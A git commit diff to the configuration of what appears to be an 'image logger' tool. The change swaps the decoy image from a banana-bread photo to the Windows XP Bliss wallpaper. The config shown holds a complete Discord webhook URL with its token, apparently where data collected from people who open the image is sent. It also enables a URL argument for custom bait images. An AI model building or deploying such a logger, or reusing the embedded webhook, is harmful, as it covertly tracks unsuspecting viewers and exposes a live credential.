3c8a695a5cfda47ceeca71d2ef8c168d2dd50ae3
sigmasigmaboyyy <baha46959@gmail.com>
2025-03-06 13:07:52 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1347173603841544263/iuifMlGuvpUmFdqxI63R0FiNo3pGBFl-dgSz1E6lGbOoPlF2doWV3OTqvQmWPDhX4t9s",
-    "image": "https://elbgesund.de/wp-content/uploads/2020/04/elbgesund-bananenbrot-03.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/en/thumb/2/27/Bliss_%28Windows_XP%29.png/270px-Bliss_%28Windows_XP%29.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
